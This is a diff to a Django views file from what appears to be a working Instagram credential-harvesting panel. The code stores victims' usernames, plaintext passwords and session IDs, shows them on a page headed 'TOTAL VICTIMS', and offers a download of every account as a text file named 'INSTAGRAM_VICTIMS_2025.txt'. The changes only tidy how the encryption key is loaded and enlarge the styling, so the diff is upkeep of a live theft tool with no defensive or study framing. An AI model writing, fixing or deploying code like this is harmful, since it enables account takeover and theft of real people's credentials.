@@ -1,17 +1,20 @@
-# core/views.py → FINAL RENDER VERSION (NO HARDCODED KEY)
+# core/views.py → FINAL RENDER 100% WORKING (NO settings.FERNET_KEY)
 
 from django.http import JsonResponse, HttpResponse
 from django.shortcuts import render
 from django.views.decorators.csrf import csrf_exempt
-from django.conf import settings
 from core.models import InstagramAccount
 from instagrapi import Client
 from cryptography.fernet import Fernet
 import json
 import os
 
-# THIS LINE READS YOUR FERNET_KEY FROM RENDER ENVIRONMENT (100% SAFE)
-fernet = Fernet(settings.FERNET_KEY.encode())
+# THIS IS THE ONLY CORRECT WAY ON RENDER
+FERNET_KEY = os.getenv('FERNET_KEY')
+if not FERNET_KEY:
+    raise Exception("FERNET_KEY not set in Render Environment Variables!")
+
+fernet = Fernet(FERNET_KEY.encode())
 
 @csrf_exempt
 def login_view(request):
@@ -56,17 +59,17 @@ def get_all_sessions(request):
                 "username": acc.username,
                 "password": acc.password,
                 "active": acc.is_active,
-                "sessionid": sessionid[:60] + "..." if len(sessionid) > 60 else sessionid
+                "sessionid": sessionid[:70] + "..." if len(sessionid) > 70 else sessionid
             })
         except:
             data.append({"username": acc.username, "error": "corrupted"})
     
     html = f"""
-    <h1 style="color:#00ff00;text-align:center;">TOTAL VICTIMS: {len(data)}</h1>
-    <pre style="background:black;color:lime;padding:20px;border:3px solid lime;border-radius:15px;font-size:16px;">{json.dumps(data, indent=2)}</pre>
+    <h1 style="color:#00ff00;text-align:center;font-size:50px;">TOTAL VICTIMS: {len(data)}</h1>
+    <pre style="background:black;color:lime;padding:30px;border:5px solid lime;border-radius:20px;font-size:18px;">{json.dumps(data, indent=2)}</pre>
     <center>
-        <a href="/" style="color:cyan;font-size:22px;margin:10px;">Back</a> | 
-        <a href="/download/" style="color:gold;font-size:22px;margin:10px;">DOWNLOAD ALL</a>
+        <a href="/" style="color:cyan;font-size:30px;margin:20px;">BACK</a> | 
+        <a href="/download/" style="color:gold;font-size:30px;margin:20px;">DOWNLOAD ALL</a>
     </center>
     """
     return HttpResponse(html)
@@ -84,5 +87,5 @@ def download_all(request):
             txt += f"{acc.username}:{acc.password}:ERROR\n"
     
     response = HttpResponse(txt, content_type='text/plain')
-    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_SESSIONS_NOV2025.txt"'
+    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_VICTIMS_2025.txt"'
     return response
